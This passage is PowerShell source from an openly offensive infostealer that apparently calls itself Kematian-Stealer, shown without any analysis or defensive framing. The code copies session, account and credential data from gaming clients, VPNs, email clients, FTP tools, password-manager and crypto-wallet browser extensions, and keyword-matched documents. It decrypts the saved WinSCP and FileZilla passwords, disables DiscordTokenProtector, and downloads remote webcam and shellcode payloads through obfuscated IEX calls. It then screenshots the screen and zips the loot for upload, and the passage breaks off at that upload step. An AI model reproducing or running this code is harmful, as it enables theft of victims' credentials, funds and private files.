        $tox_folder = "$env:appdata\Tox"
        if (!(Test-Path $tox_folder)) { return }
        $tox_session = "$folder_messaging\Tox"
        New-Item -ItemType Directory -Force -Path $tox_session | Out-Null
        Get-ChildItem -Path "$tox_folder" |  Copy-Item -Destination $tox_session -Recurse -Force
    }
    tox_stealer

    # All Gaming Sessions
    
    # Steam 
    function steamstealer {
        $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
        if (!(Test-Path $steamfolder)) { return }
        $steam_session = "$folder_gaming\Steam"
        New-Item -ItemType Directory -Force -Path $steam_session | Out-Null
        Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
        $ssfnfiles = @("ssfn$1")
        foreach ($file in $ssfnfiles) {
            Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $steam_session }
        }
    }
    steamstealer


    # Minecraft 
    function minecraftstealer {
        $minecraft_session = "$folder_gaming\Minecraft"
        New-Item -ItemType Directory -Force -Path $minecraft_session | Out-Null
        $minecraft_paths = @{
            "Minecraft" = @{
                "Intent"          = Join-Path $env:userprofile "intentlauncher\launcherconfig"
                "Lunar"           = Join-Path $env:userprofile ".lunarclient\settings\game\accounts.json"
                "TLauncher"       = Join-Path $env:userprofile "AppData\Roaming\.minecraft\TlauncherProfiles.json"
                "Feather"         = Join-Path $env:userprofile "AppData\Roaming\.feather\accounts.json"
                "Meteor"          = Join-Path $env:userprofile "AppData\Roaming\.minecraft\meteor-client\accounts.nbt"
                "Impact"          = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Impact\alts.json"
                "Novoline"        = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Novoline\alts.novo"
                "CheatBreakers"   = Join-Path $env:userprofile "AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
                "Microsoft Store" = Join-Path $env:userprofile "AppData\Roaming\.minecraft\launcher_accounts_microsoft_store.json"
                "Rise"            = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Rise\alts.txt"
                "Rise (Intent)"   = Join-Path $env:userprofile "intentlauncher\Rise\alts.txt"
                "Paladium"        = Join-Path $env:userprofile "AppData\Roaming\paladium-group\accounts.json"
                "PolyMC"          = Join-Path $env:userprofile "AppData\Roaming\PolyMC\accounts.json"
                "Badlion"         = Join-Path $env:userprofile "AppData\Roaming\Badlion Client\accounts.json"
            }
        } 
        foreach ($launcher in $minecraft_paths.Keys) {
            foreach ($pathName in $minecraft_paths[$launcher].Keys) {
                $sourcePath = $minecraft_paths[$launcher][$pathName]
                if (Test-Path $sourcePath) {
                    $destination = Join-Path -Path $minecraft_session -ChildPath $pathName
                    New-Item -ItemType Directory -Path $destination -Force | Out-Null
                    Copy-Item -Path $sourcePath -Destination $destination -Recurse -Force
                }
            }
        }
    }
    minecraftstealer

    # Epicgames 
    function epicgames_stealer {
        $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
        if (!(Test-Path $epicgamesfolder)) { return }
        $epicgames_session = "$folder_gaming\EpicGames"
        New-Item -ItemType Directory -Force -Path $epicgames_session | Out-Null
        Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
        Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -force
        Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
    }
    epicgames_stealer

    # Ubisoft 
    function ubisoftstealer {
        $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
        if (!(Test-Path $ubisoftfolder)) { return }
        $ubisoft_session = "$folder_gaming\Ubisoft"
        New-Item -ItemType Directory -Force -Path $ubisoft_session | Out-Null
        Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
    }
    ubisoftstealer

    # EA 
    function electronic_arts {
        $eafolder = "$env:localappdata\Electronic Arts\EA Desktop\CEF"
        if (!(Test-Path $eafolder)) { return }
        $ea_session = "$folder_gaming\Electronic Arts"
        New-Item -ItemType Directory -Path $ea_session -Force | Out-Null
        $parentDirName = (Get-Item $eafolder).Parent.Name
        $destination = Join-Path $ea_session $parentDirName
        New-Item -ItemType Directory -Path $destination -Force | Out-Null
        Copy-Item -Path $eafolder -Destination $destination -Recurse -Force
    }
    electronic_arts

    # Growtopia 
    function growtopiastealer {
        $growtopiafolder = "$env:localappdata\Growtopia"
        if (!(Test-Path $growtopiafolder)) { return }
        $growtopia_session = "$folder_gaming\Growtopia"
        New-Item -ItemType Directory -Force -Path $growtopia_session | Out-Null
        $save_file = "$growtopiafolder\save.dat"
        if (Test-Path $save_file) { Copy-Item -Path $save_file -Destination $growtopia_session } 
    }
    growtopiastealer

    # Battle.net
    function battle_net_stealer {
        $battle_folder = "$env:appdata\Battle.net"
        if (!(Test-Path $battle_folder)) { return }
        $battle_session = "$folder_gaming\Battle.net"
        New-Item -ItemType Directory -Force -Path $battle_session | Out-Null
        $files = Get-ChildItem -Path $battle_folder -File -Recurse -Include "*.db", "*.config" 
        foreach ($file in $files) {
            Copy-Item -Path $file.FullName -Destination $battle_session
        }
    }
    battle_net_stealer

    # All VPN Sessions

    # ProtonVPN
    function protonvpnstealer {   
        $protonvpnfolder = "$env:localappdata\protonvpn"  
        if (!(Test-Path $protonvpnfolder)) { return }
        $protonvpn_account = "$folder_vpn\ProtonVPN"
        New-Item -ItemType Directory -Force -Path $protonvpn_account | Out-Null
        $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
        $directories = Get-ChildItem -Path $protonvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
        }
    }
    protonvpnstealer


    #Surfshark VPN
    function surfsharkvpnstealer {
        $surfsharkvpnfolder = "$env:appdata\Surfshark"
        if (!(Test-Path $surfsharkvpnfolder)) { return }
        $surfsharkvpn_account = "$folder_vpn\Surfshark"
        New-Item -ItemType Directory -Force -Path $surfsharkvpn_account | Out-Null
        Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
    }
    surfsharkvpnstealer
    
    # OpenVPN 
    function openvpn_stealer {
        $openvpnfolder = "$env:userprofile\AppData\Roaming\OpenVPN Connect"
        if (!(Test-Path $openvpnfolder)) { return }
        $openvpn_accounts = "$folder_vpn\OpenVPN"
        New-Item -ItemType Directory -Force -Path $openvpn_accounts | Out-Null
        Copy-Item -Path "$openvpnfolder\profiles" -Destination $openvpn_accounts -Recurse -force 
        Copy-Item -Path "$openvpnfolder\config.json" -Destination $openvpn_accounts -Recurse -force 
    }
    openvpn_stealer
    
    # Thunderbird 
    function thunderbirdbackup {
        $thunderbirdfolder = "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles"
        if (!(Test-Path $thunderbirdfolder)) { return }
        $thunderbirdbackup = "$folder_email\Thunderbird"
        New-Item -ItemType Directory -Force -Path $thunderbirdbackup | Out-Null
        $pattern = "^[a-z0-9]+\.default-esr$"
        $directories = Get-ChildItem -Path $thunderbirdfolder -Directory | Where-Object { $_.Name -match $pattern }
        $filter = @("key4.db", "key3.db", "logins.json", "cert9.db", "*.js")
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $thunderbirdbackup -ChildPath $directory.Name
            New-Item -ItemType Directory -Force -Path $destinationPath | Out-Null
            foreach ($filePattern in $filter) {
                Get-ChildItem -Path $directory.FullName -Recurse -Filter $filePattern -File | ForEach-Object {
                    $relativePath = $_.FullName.Substring($directory.FullName.Length).TrimStart('\')
                    $destFilePath = Join-Path -Path $destinationPath -ChildPath $relativePath
                    $destFileDir = Split-Path -Path $destFilePath -Parent
                    if (!(Test-Path -Path $destFileDir)) {
                        New-Item -ItemType Directory -Force -Path $destFileDir | Out-Null
                    }
                    Copy-Item -Path $_.FullName -Destination $destFilePath -Force
                }
            }
        }
    }
    thunderbirdbackup
	
    # MailBird
    function mailbird_backup {
        $mailbird_folder = "$env:localappdata\MailBird"
        if (!(Test-Path $mailbird_folder)) { return }
        $mailbird_db = "$folder_email\MailBird"
        New-Item -ItemType Directory -Force -Path $mailbird_db | Out-Null
        Copy-Item -Path "$mailbird_folder\Store\Store.db" -Destination $mailbird_db -Recurse -force
    } 
    mailbird_backup

    # FTP Clients 

    # Filezilla 
    function filezilla_stealer {
        $FileZillafolder = "$env:appdata\FileZilla"
        if (!(Test-Path $FileZillafolder)) { return }
        $filezilla_hosts = "$ftp_clients\FileZilla"
        New-Item -ItemType Directory -Force -Path $filezilla_hosts | Out-Null
        $recentServersXml = Join-Path -Path $FileZillafolder -ChildPath 'recentservers.xml'
        $siteManagerXml = Join-Path -Path $FileZillafolder -ChildPath 'sitemanager.xml'
        function ParseServerInfo {
            param ([string]$xmlContent)
            $matches = [regex]::Match($xmlContent, "<Host>(.*?)</Host>.*<Port>(.*?)</Port>")
            $serverHost = $matches.Groups[1].Value
            $serverPort = $matches.Groups[2].Value
            $serverUser = [regex]::Match($xmlContent, "<User>(.*?)</User>").Groups[1].Value
            # Check if both User and Pass are blank
            if ([string]::IsNullOrWhiteSpace($serverUser)) { return "Host: $serverHost `nPort: $serverPort`n" }
            # if User is not blank, continue with authentication details
            $encodedPass = [regex]::Match($xmlContent, "<Pass encoding=`"base64`">(.*?)</Pass>").Groups[1].Value
            $decodedPass = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPass))
            return "Host: $serverHost `nPort: $serverPort `nUser: $serverUser `nPass: $decodedPass`n"
        }       
        $serversInfo = @()
        foreach ($xmlFile in @($recentServersXml, $siteManagerXml)) {
            if (Test-Path $xmlFile) {
                $xmlContent = Get-Content -Path $xmlFile
                $servers = [System.Collections.ArrayList]@()
                $xmlContent | Select-String -Pattern "<Server>" -Context 0, 10 | ForEach-Object {
                    $serverInfo = ParseServerInfo -xmlContent $_.Context.PostContext
                    $servers.Add($serverInfo) | Out-Null
                }
                $serversInfo += $servers -join "`n"
            }
        }
        $serversInfo | Out-File -FilePath "$filezilla_hosts\Hosts.txt" -Force
        Write-Host "[!] Filezilla Session information saved" -ForegroundColor Green
    }
    filezilla_stealer
	
    #  WinSCP  
    function Get-WinSCPSessions {
        $registryPath = "SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
        $winscp_session = "$ftp_clients\WinSCP"
        New-Item -ItemType Directory -Force -Path $winscp_session | Out-Null
        $outputPath = "$winscp_session\WinSCP-sessions.txt"
        $output = "WinSCP Sessions`n`n"
        $hive = [UInt32] "2147483649" # HKEY_CURRENT_USER
        function Get-RegistryValue {
            param ([string]$subKey, [string]$valueName)
            $result = Invoke-WmiMethod -Namespace "root\default" -Class StdRegProv -Name GetStringValue -ArgumentList $hive, $subKey, $valueName
            return $result.sValue
        }
        function Get-RegistrySubKeys {
            param ([string]$subKey)
            $result = Invoke-WmiMethod -Namespace "root\default" -Class StdRegProv -Name EnumKey -ArgumentList $hive, $subKey
            return $result.sNames
        }
        $sessionKeys = Get-RegistrySubKeys -subKey $registryPath
        if ($null -eq $sessionKeys) {
            Write-Host "[!] Failed to enumerate registry keys under $registryPath" -ForegroundColor Red
            return
        }
        function DecryptNextCharacterWinSCP {
            param ([string]$remainingPass)
            $Magic = 163
            $flagAndPass = "" | Select-Object -Property flag, remainingPass
            $firstval = ("0123456789ABCDEF".indexOf($remainingPass[0]) * 16)
            $secondval = "0123456789ABCDEF".indexOf($remainingPass[1])
            $Added = $firstval + $secondval
            $decryptedResult = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256
            $flagAndPass.flag = $decryptedResult
            $flagAndPass.remainingPass = $remainingPass.Substring(2)
            return $flagAndPass
        }
        function DecryptWinSCPPassword {
            param ([string]$SessionHostname, [string]$SessionUsername, [string]$Password)
            $CheckFlag = 255
            $Magic = 163
            $key = $SessionHostname + $SessionUsername
            $values = DecryptNextCharacterWinSCP -remainingPass $Password
            $storedFlag = $values.flag
            if ($values.flag -eq $CheckFlag) {
                $values.remainingPass = $values.remainingPass.Substring(2)
                $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
            }
            $len = $values.flag
            $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
            $values.remainingPass = $values.remainingPass.Substring(($values.flag * 2))
            $finalOutput = ""
            for ($i = 0; $i -lt $len; $i++) {
                $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
                $finalOutput += [char]$values.flag
            }
            if ($storedFlag -eq $CheckFlag) {
                return $finalOutput.Substring($key.Length)
            }
            return $finalOutput
        }
        foreach ($sessionKey in $sessionKeys) {
            $sessionName = $sessionKey
            $sessionPath = "$registryPath\$sessionName"
            $hostname = Get-RegistryValue -subKey $sessionPath -valueName "HostName"
            $username = Get-RegistryValue -subKey $sessionPath -valueName "UserName"
            $encryptedPassword = Get-RegistryValue -subKey $sessionPath -valueName "Password"
            if ($encryptedPassword) {
                $password = DecryptWinSCPPassword -SessionHostname $hostname -SessionUsername $username -Password $encryptedPassword
            }
            else {
                $password = "No password saved"
            }
            $output += "Session  : $sessionName`n"
            $output += "Hostname : $hostname`n"
            $output += "Username : $username`n"
            $output += "Password : $password`n`n"
        }
        $output | Out-File -FilePath $outputPath
        Write-Host "[!] WinSCP Session information saved" -ForegroundColor Green
    }
    Get-WinSCPSessions

    # Password Managers
    function password_managers {
        $browserPaths = @{
            "Brave"       = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
            "Chrome"      = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
            "Chromium"    = Join-Path $env:LOCALAPPDATA "Chromium\User Data"
            "Edge"        = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
            "EpicPrivacy" = Join-Path $env:LOCALAPPDATA "Epic Privacy Browser\User Data"
            "Iridium"     = Join-Path $env:LOCALAPPDATA "Iridium\User Data"
            "Opera"       = Join-Path $env:APPDATA "Opera Software\Opera Stable"
            "OperaGX"     = Join-Path $env:APPDATA "Opera Software\Opera GX Stable"
            "Vivaldi"     = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
            "Yandex"      = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
        }
        $password_mgr_dirs = @{
            "bhghoamapcdpbohphigoooaddinpkbai" = "Authenticator"
            "aeblfdkhhhdcdjpifhhbdiojplfjncoa" = "1Password"                  
            "eiaeiblijfjekdanodkjadfinkhbfgcd" = "NordPass" 
            "fdjamakpfbbddfjaooikfcpapjohcfmg" = "DashLane" 
            "nngceckbapebfimnlniiiahkandclblb" = "Bitwarden" 
            "pnlccmojcmeohlpggmfnbbiapkmbliob" = "RoboForm" 
            "bfogiafebfohielmmehodmfbbebbbpei" = "Keeper" 
            "cnlhokffphohmfcddnibpohmkdfafdli" = "MultiPassword" 
            "oboonakemofpalcgghocfoadofidjkkk" = "KeePassXC" 
            "hdokiejnpimakedhajhdlcegeplioahd" = "LastPass" 
        }
        foreach ($browser in $browserPaths.GetEnumerator()) {
            $browserName = $browser.Key
            $browserPath = $browser.Value
            if (Test-Path $browserPath) {
                Get-ChildItem -Path $browserPath -Recurse -Directory -Filter "Local Extension Settings" -ErrorAction SilentlyContinue | ForEach-Object {
                    $localExtensionsSettingsDir = $_.FullName
                    foreach ($password_mgr_dir in $password_mgr_dirs.GetEnumerator()) {
                        $passwordmgrkey = $password_mgr_dir.Key
                        $password_manager = $password_mgr_dir.Value
                        $extentionPath = Join-Path $localExtensionsSettingsDir $passwordmgrkey
                        if (Test-Path $extentionPath) {
                            if (Get-ChildItem $extentionPath -ErrorAction SilentlyContinue) {
                                try {
                                    $password_mgr_browser = "$password_manager ($browserName)"
                                    $password_dir_path = Join-Path $password_managers $password_mgr_browser
                                    New-Item -ItemType Directory -Path $password_dir_path -Force | out-null
                                    Copy-Item -Path $extentionPath -Destination $password_dir_path -Recurse -Force
                                    $locationFile = Join-Path $password_dir_path "Location.txt"
                                    $extentionPath | Out-File -FilePath $locationFile -Force
                                    Write-Host "[!] Copied $password_manager from $extentionPath to $password_dir_path" -ForegroundColor Green
                                }
                                catch {
                                    Write-Host "[!] Failed to copy $password_manager from $extentionPath" -ForegroundColor Red
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    password_managers

    function Local_Crypto_Wallets {
        $wallet_paths = @{
            "Local Wallets" = @{
                "Armory"           = Join-Path $env:appdata      "\Armory\*.wallet"
                "Atomic"           = Join-Path $env:appdata      "\Atomic\Local Storage\leveldb"
                "Bitcoin"          = Join-Path $env:appdata      "\Bitcoin\wallets"
                "Bytecoin"         = Join-Path $env:appdata      "\bytecoin\*.wallet"
                "Coinomi"          = Join-Path $env:localappdata "Coinomi\Coinomi\wallets"
                "Dash"             = Join-Path $env:appdata      "\DashCore\wallets"
                "Electrum"         = Join-Path $env:appdata      "\Electrum\wallets"
                "Ethereum"         = Join-Path $env:appdata      "\Ethereum\keystore"
                "Exodus"           = Join-Path $env:appdata      "\Exodus\exodus.wallet"
                "Guarda"           = Join-Path $env:appdata      "\Guarda\Local Storage\leveldb"
                "com.liberty.jaxx" = Join-Path $env:appdata      "\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb"
                "Litecoin"         = Join-Path $env:appdata      "\Litecoin\wallets"
                "MyMonero"         = Join-Path $env:appdata      "\MyMonero\*.mmdbdoc_v1"
                "Monero GUI"       = Join-Path $env:appdata      "Documents\Monero\wallets\"
            }
        }
        $zephyr_path = "$env:appdata\Zephyr\wallets"
        New-Item -ItemType Directory -Path "$folder_crypto\Zephyr" -Force | Out-Null
        if (Test-Path $zephyr_path) { Get-ChildItem -Path $zephyr_path -Filter "*.keys" -Recurse | Copy-Item -Destination "$folder_crypto\Zephyr" -Force }	
        foreach ($wallet in $wallet_paths.Keys) {
            foreach ($pathName in $wallet_paths[$wallet].Keys) {
                $sourcePath = $wallet_paths[$wallet][$pathName]
                if (Test-Path $sourcePath) {
                    $destination = Join-Path -Path $folder_crypto -ChildPath $pathName
                    New-Item -ItemType Directory -Path $destination -Force | Out-Null
                    Copy-Item -Path $sourcePath -Recurse -Destination $destination -Force
                }
            }
        }
    }
    Local_Crypto_Wallets
	
    function browserwallets {
        $browserPaths = @{
            "Brave"       = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
            "Chrome"      = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
            "Chromium"    = Join-Path $env:LOCALAPPDATA "Chromium\User Data"
            "Edge"        = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
            "EpicPrivacy" = Join-Path $env:LOCALAPPDATA "Epic Privacy Browser\User Data"
            "Iridium"     = Join-Path $env:LOCALAPPDATA "Iridium\User Data"
            "Opera"       = Join-Path $env:APPDATA "Opera Software\Opera Stable"
            "OperaGX"     = Join-Path $env:APPDATA "Opera Software\Opera GX Stable"
            "Vivaldi"     = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
            "Yandex"      = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
        }
        $walletDirs = @{
            "dlcobpjiigpikoobohmabehhmhfoodbb" = "Argent X"
            "fhbohimaelbohpjbbldcngcnapndodjp" = "Binance Chain Wallet"
            "jiidiaalihmmhddjgbnbgdfflelocpak" = "BitKeep Wallet"
            "bopcbmipnjdcdfflfgjdgdjejmgpoaab" = "BlockWallet"
            "odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Coinbase"
            "hifafgmccdpekplomjjkcfgodnhcellj" = "Crypto.com"
            "kkpllkodjeloidieedojogacfhpaihoh" = "Enkrypt"
            "mcbigmjiafegjnnogedioegffbooigli" = "Ethos Sui"
            "aholpfdialjgjfhomihkjbmgjidlcdno" = "ExodusWeb3"
            "hpglfhgfnhbgpjdenjgmdgoeiappafln" = "Guarda"
            "dmkamcknogkgcdfhhbddcghachkejeap" = "Keplr"
            "afbcbjpbpfadlkmhmclhkeeodmamcflc" = "MathWallet"
            "nkbihfbeogaeaoehlefnkodbefgpgknn" = "Metamask"
            "ejbalbakoplchlghecdalmeeeajnimhm" = "Metamask2"
            "mcohilncbfahbmgdjkbpemcciiolgcge" = "OKX"
            "jnmbobjmhlngoefaiojfljckilhhlhcj" = "OneKey"
            "bfnaelmomeimhlpmgjnjophhpkkoljpa" = "Phantom"
            "fnjhmkhhmkbjkkabndcnnogagogbneec" = "Ronin"
            "lgmpcpglpngdoalbgeoldeajfclnhafa" = "SafePal"
            "mfgccjchihfkkindfppnaooecgfneiii" = "TokenPocket"
            "nphplpgoakhhjchkkhmiggakijnkhfnd" = "Ton"
            "ibnejdfjmmkpcnlpebklmnkoeoihofec" = "TronLink"
            "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
            "amkmjjmmflddogmhpjloimipbofnfjih" = "Wombat"
            "heamnjbnflcikcggoiplibfommfbkjpj" = "Zeal"       
        }
        foreach ($browser in $browserPaths.GetEnumerator()) {
            $browserName = $browser.Key
            $browserPath = $browser.Value
            if (Test-Path $browserPath) {
                Get-ChildItem -Path $browserPath -Recurse -Directory -Filter "Local Extension Settings" -ErrorAction SilentlyContinue | ForEach-Object {
                    $localExtensionsSettingsDir = $_.FullName
                    foreach ($walletDir in $walletDirs.GetEnumerator()) {
                        $walletKey = $walletDir.Key
                        $walletName = $walletDir.Value
                        $extentionPath = Join-Path $localExtensionsSettingsDir $walletKey
                        if (Test-Path $extentionPath) {
                            if (Get-ChildItem $extentionPath -ErrorAction SilentlyContinue) {
                                try {
                                    $wallet_browser = "$walletName ($browserName)"
                                    $walletDirPath = Join-Path $folder_crypto $wallet_browser
                                    New-Item -ItemType Directory -Path $walletDirPath -Force | out-null
                                    Copy-Item -Path $extentionPath -Destination $walletDirPath -Recurse -Force
                                    $locationFile = Join-Path $walletDirPath "Location.txt"
                                    $extentionPath | Out-File -FilePath $locationFile -Force
                                    Write-Host "[!] Copied $walletName wallet from $extentionPath to $walletDirPath" -ForegroundColor Green
                                }
                                catch {
                                    Write-Host "[!] Failed to copy $walletName wallet from $extentionPath" -ForegroundColor Red
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    browserwallets
 
	
    Write-Host "[!] Session Grabbing Ended" -ForegroundColor Green

    # Had to do it like this due to https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:PowerShell/EmpireGetScreenshot.A&threatId=-2147224978
    #webcam function doesn't work on anything with .NET 8 or higher. Fix it if you want to use it and make a PR. I tried but I keep getting errors writting to protected memory lol.

    # Fix webcam hang with unsupported devices
    
    Write-Host "[!] Capturing an image with Webcam" -ForegroundColor Green
    $webcam = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
    $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
    $invokewebcam.WaitForExit()

    function FilesGrabber {
        $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log", "*.pem", "*.ppk", "*.key", "*.pfx")
        $keywords = @("2fa", "account", "auth", "backup", "bank", "binance", "bitcoin", "bitwarden", "btc", "casino", "code", "coinbase ", "crypto", "dashlane", "discord", "eth", "exodus", "facebook", "funds", "info", "keepass", "keys", "kraken", "kucoin", "lastpass", "ledger", "login", "mail", "memo", "metamask", "mnemonic", "nordpass", "note", "pass", "passphrase", "paypal", "pgp", "private", "pw", "recovery", "remote", "roboform", "secret", "seedphrase", "server", "skrill", "smtp", "solana", "syncthing", "tether", "token", "trading", "trezor", "venmo", "vault", "wallet")
        $paths = @("$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop")
        foreach ($path in $paths) {
            $files = Get-ChildItem -Path $path -Recurse -Include $allowedExtensions | Where-Object {
                $_.Length -lt 1mb -and $_.Name -match ($keywords -join '|')
            }
            foreach ($file in $files) {
                $destination = Join-Path -Path $important_files -ChildPath $file.Name
                if ($file.FullName -ne $destination) {
                    Copy-Item -Path $file.FullName -Destination $destination -Force
                }
            }
        }
        # Send info about the keywords that match a grabbed file
        $keywordsUsed = @()
        foreach ($keyword in $keywords) {
            foreach ($file in (Get-ChildItem -Path $important_files -Recurse)) {
                if ($file.Name -like "*$keyword*") {
                    if ($file.Length -lt 1mb) {
                        if ($keywordsUsed -notcontains $keyword) {
                            $keywordsUsed += $keyword
                            $keywordsUsed | Out-File "$folder_general\Important_Files_Keywords.txt" -Force
                        }
                    }
                }
            }
        }
    }
    FilesGrabber

    Set-Location "$env:LOCALAPPDATA\Temp"

    $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
    if ($token_prot -eq $true) {
        Stop-Process -Name DiscordTokenProtector -Force -ErrorAction 'SilentlyContinue'
        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force -ErrorAction 'SilentlyContinue'
    }

    $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
    if ($secure_dat -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
    }


    #$locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
    #$discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")

    #foreach ($path in $discPaths) {
    #    $skibidipath = Join-Path $locAppData $path
    #    if (-not (Test-Path $skibidipath)) {
    #        continue
    #    }
    #    Get-ChildItem $skibidipath -Recurse | ForEach-Object {
    #        if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
    #            $files = Get-ChildItem $_.FullName
    #            foreach ($file in $files) {
    #                if ($file.Name -eq "index.js") {
    #                    $webClient = New-Object System.Net.WebClient
    #                    $content = $webClient.DownloadString("https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/injection.js")
    #                    if ($content -ne "") {
    #                        $replacedContent = $content -replace "%WEBHOOK%", $webhook
    #                        $replacedContent | Set-Content -Path $file.FullName -Force
    #                    }
    #                }
    #            }
    #        }
    #    }
    #}
    
    #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
    
    Write-Host "[!] Injecting Shellcode" -ForegroundColor Green
    $kematian_shellcode = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
    $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
    $proc.WaitForExit()
    Write-Host "[!] Shellcode Injection Completed" -ForegroundColor Green


    $main_temp = "$env:localappdata\temp"

    $width, $height = $screen -split ' x '
    $monitor = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $top = $monitor.Top
    $left = $monitor.Left
    $bounds = [System.Drawing.Rectangle]::FromLTRB($left, $top, [int]$width, [int]$height)
    $image = New-Object System.Drawing.Bitmap([int]$bounds.Width, [int]$bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($image)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $image.Save("$main_temp\screenshot.png")
    $graphics.Dispose()
    $image.Dispose()


    Write-Host "[!] Screenshot Captured" -ForegroundColor Green

    Move-Item "$main_temp\discord.json" $folder_general -Force    
    Move-Item "$main_temp\screenshot.png" $folder_general -Force
    Move-Item -Path "$main_temp\autofill.json" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\cards.json" -Destination "$browser_data" -Force
    #move any file that starts with cookies_netscape
    Get-ChildItem -Path $main_temp -Filter "cookies_netscape*" | Move-Item -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\downloads.json" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\history.json" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\passwords.json" -Destination "$browser_data" -Force

    #remove empty dirs
    do {
        $dirs = Get-ChildItem $folder_general -Directory -Recurse | Where-Object { (Get-ChildItem $_.FullName).Count -eq 0 } | Select-Object -ExpandProperty FullName
        $dirs | ForEach-Object { Remove-Item $_ -Force }
    } while ($dirs.Count -gt 0)
    
    Write-Host "[!] Getting information about the extracted data" -ForegroundColor Green
    
    function ProcessCookieFiles {
        $domaindetects = New-Item -ItemType Directory -Path "$folder_general\DomainDetects" -Force
        $cookieFiles = Get-ChildItem -Path $browser_data -Filter "cookies_netscape*"
        foreach ($file in $cookieFiles) {
            $outputFileName = $file.Name -replace "^cookies_netscape_|-Browser"
            $fileContents = Get-Content -Path $file.FullName
            $domainCounts = @{}
            foreach ($line in $fileContents) {
                if ($line -match "^\s*(\S+)\s") {
                    $domain = $matches[1].TrimStart('.')
                    if ($domainCounts.ContainsKey($domain)) {
                        $domainCounts[$domain]++
                    }
                    else {
                        $domainCounts[$domain] = 1
                    }
                }
            }
            $outputString = ($domainCounts.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Name) ($($_.Value))" }) -join "`n"
            $outputFilePath = Join-Path -Path $domaindetects -ChildPath $outputFileName
            Set-Content -Path $outputFilePath -Value $outputString
        }
    }
    ProcessCookieFiles 

    $zipFileName = "$uuid`_$countrycode`_$hostname`_$filedate`_$timezoneString.zip"
    $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"

    Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force

    Write-Host $ZipFilePath
    Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
    if ( -not ($write_disk_only)) {    
